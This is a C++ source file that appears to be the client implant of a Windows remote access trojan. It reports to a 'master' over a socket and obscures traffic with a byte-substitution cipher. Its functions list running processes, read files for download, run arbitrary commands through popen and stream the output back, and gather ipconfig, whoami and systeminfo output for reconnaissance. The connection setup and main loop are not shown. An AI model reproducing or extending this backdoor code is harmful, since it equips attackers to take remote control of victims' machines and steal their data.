
#include <iostream>
#include <iostream>
#include <cstdio>
#include <windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <string>
#include <Winsock2.h>
#include <stdlib.h>

#define WIN32_LEAN_AND_MEAN
#define BUF_SIZE 2000

using namespace std;

void send_data(SOCKET, string);
//void get_command(SOCKET current_client, char recvbuf[BUF_SIZE]);
string process_list(SOCKET sock);
string dl_file(SOCKET sock, string);
int ul_file(SOCKET, string);
string rce(SOCKET sock, string);
string net_info(SOCKET sock);
string whoami(SOCKET sock);
string sys_info(SOCKET sock);
void encrypt(unsigned char *, int);
void decrypt(unsigned char *, int);

const unsigned char plain[] = {0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,
0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,
0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2a,
0x2b,0x2c,0x2d,0x2e,0x2f,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,
0x3b,0x3c,0x3d,0x3e,0x3f,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,
0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,
0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,
0x6b,0x6c,0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,
0x7b,0x7c,0x7d,0x7e,0x7f,0x80,0x81,0x82,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8a,
0x8b,0x8c,0x8d,0x8e,0x8f,0x90,0x91,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9a,
0x9b,0x9c,0x9d,0x9e,0x9f,0xa0,0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,
0xab,0xac,0xad,0xae,0xaf,0xb0,0xb1,0xb2,0xb3,0xb4,0xb5,0xb6,0xb7,0xb8,0xb9,0xba,
0xbb,0xbc,0xbd,0xbe,0xbf,0xc0,0xc1,0xc2,0xc3,0xc4,0xc5,0xc6,0xc7,0xc8,0xc9,0xca,
0xcb,0xcc,0xcd,0xce,0xcf,0xd0,0xd1,0xd2,0xd3,0xd4,0xd5,0xd6,0xd7,0xd8,0xd9,0xda,
0xdb,0xdc,0xdd,0xde,0xdf,0xe0,0xe1,0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,
0xeb,0xec,0xed,0xee,0xef,0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,
0xfb,0xfc,0xfd,0xfe,0xff
};

const unsigned char sub[] = {0xb8,0x52,0xb2,0x3c,0x8d,0x49,0x9d,0x15,0x02,0xc7,0x8c,
0x1e,0x5e,0x50,0xe1,0x68,0x76,0x96,0xa8,0xfd,0x83,0xce,0xac,0x2b,0xe8,0xdd,0xff,
0xfc,0x6b,0x98,0xd9,0xd0,0x40,0xf3,0xa7,0x59,0x92,0x2f,0x79,0x13,0x25,0x5d,0xd7,
0x7d,0x46,0x56,0x1d,0x14,0xc1,0xd2,0xef,0x88,0x6c,0xcd,0x5f,0xb4,0x81,0x29,0xe6,
0x06,0x1a,0xa6,0xee,0x10,0xf0,0xad,0x4c,0x6e,0xd5,0x85,0xf7,0x82,0x8f,0x73,0x72,
0xa9,0x63,0x55,0x99,0x2e,0x30,0xfb,0xdb,0x1b,0xcc,0x42,0xcf,0xc0,0xb6,0x95,0xdf,
0xbb,0x4d,0xc8,0x41,0x65,0xbd,0x8e,0x7c,0x43,0x31,0xaa,0xde,0x80,0xd6,0x69,0x23,
0xb1,0x4a,0xcb,0x01,0xbe,0xab,0x7e,0xe7,0x07,0x77,0x67,0x0d,0xba,0x90,0x2d,0xbc,
0x62,0x0a,0xb0,0x7f,0x3e,0x34,0xeb,0xe3,0x0b,0xf2,0x75,0x36,0x9c,0x3b,0xb5,0x94,
0x86,0x38,0x1c,0xd8,0x26,0xd4,0xe4,0x08,0x53,0x89,0x4f,0x3f,0x22,0x03,0x7b,0xf4,
0xae,0x64,0x28,0x39,0x04,0xf1,0x20,0xea,0x9b,0x7a,0x61,0xdc,0x32,0x21,0x97,0x93,
0xa3,0x9a,0x33,0x3d,0x71,0xe5,0x0e,0xfa,0xf6,0x66,0x2c,0x9f,0x1f,0x37,0x35,0xf9,
0xc3,0xe9,0x6a,0xaf,0x48,0x6f,0xec,0xb9,0x5c,0x51,0xc2,0x74,0xca,0xb3,0x8a,0xc5,
0xd1,0x05,0xa2,0x60,0x27,0xe0,0x3a,0x44,0x5b,0xd3,0x4b,0x24,0x87,0xf5,0x0c,0x12,
0xc4,0x5a,0x16,0x9e,0xa1,0x78,0x0f,0xf8,0x70,0x19,0xa0,0xa5,0x47,0x57,0xa4,0x84,
0x00,0xfe,0xda,0x17,0x2a,0x8b,0x4e,0x45,0x54,0x58,0x91,0xc9,0x09,0xbf,0xe2,0xb7,
0x6d,0xc6,0x11,0x18,0xed
};

// Take char array and its length to encrypt
void encrypt(unsigned char *data, int length){
	for(int n=0;n<length;n++){
		data[n] = sub[data[n]];
	}
}
// Take char array and its length to decrypt
void decrypt(unsigned char *data, int length){
	for(int n=0;n<length;n++){
		for (int i = 0; i < sizeof(plain); i++){
			if (data[n] == sub[i]){
				data[n] = plain[i];
				break;
			}
		}
	}
}

void send_data(SOCKET current_client, string str){
    //Send data to the master
    send(current_client, str.c_str(), str.size(), 0);
    Sleep(20);
}

/*
void get_command(SOCKET current_client, char recvbuf[BUF_SIZE]){
    int errCode;    // for error checking

    memset(&recvbuf, 0, sizeof(recvbuf));
    // Receive function option from user
    errCode = recv(current_client, recvbuf, BUF_SIZE, 0);
    printf("Data received: %s\n", recvbuf);
    if (errCode > 0){
            printf("Data received: %s\n", recvbuf);
        } else if (errCode == 0){
            printf("Connection closed...\n");
        } else {
            printf("Failed to receive data: %d\n", WSAGetLastError());
        }
}; */

string process_list(SOCKET sock){
    string str = "";
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            send_data(sock, entry.szExeFile);
            str.append(entry.szExeFile);
            str.append("\n");
        }
    }
    //send_data(sock, str.c_str());
    CloseHandle(snapshot);

	return str;
}

string dl_file(SOCKET sock, string filename){
    string data;
    string line;
    fstream myfile;
    myfile.open(filename.c_str(), ios::in);
      if (myfile.is_open())
      {
        while ( getline (myfile,line) )
        {
          data.append(line);
        }

        myfile.close();
      }
	return data;
}

int ul_file(SOCKET sock, string filename){
    /*string str;
    int errCode = recv(sock, str.c_str(), BUF_SIZE, 0);
    ofstream myfile;
    myfile.open(str.c_str());

    while(str.find("<END>") < 0){
        errCode = recv(sock, str.c_str(), BUF_SIZE, 0);
        myfile << decrypt(str.c_str());
    }
*/
	return 0;
}

string rce(SOCKET sock, string command){
	char buf[512];
	string str = "";
    FILE *output = popen(command.c_str(), "r");
    while(fgets(buf, sizeof(buf), output)!=NULL){
        send_data(sock, buf);
        str.append(buf);
    }
    //printf("%s\n", str.c_str());
    //send_data(sock, str.c_str());

    pclose(output);
	return str;
}

string net_info(SOCKET sock){
    char buf[512];
	string str = "";
    FILE *output = popen("ipconfig", "r");
    while(fgets(buf, sizeof(buf), output)!=NULL){
        str.append(buf);
    }
    pclose(output);
	return str;
}

string whoami(SOCKET sock){
    char buf[512];
	string str = "";
    FILE *output = popen("whoami", "r");
    while(fgets(buf, sizeof(buf), output)!=NULL){
        str.append(buf);
    }
    pclose(output);
	return str;
}

string sys_info(SOCKET sock){
    char buf[512];
	string str = "";
    FILE *output = popen("systeminfo", "r");
    while(fgets(buf, sizeof(buf), output)!=NULL){
        str.append(buf);
    }
    pclose(output);
	return str;
}
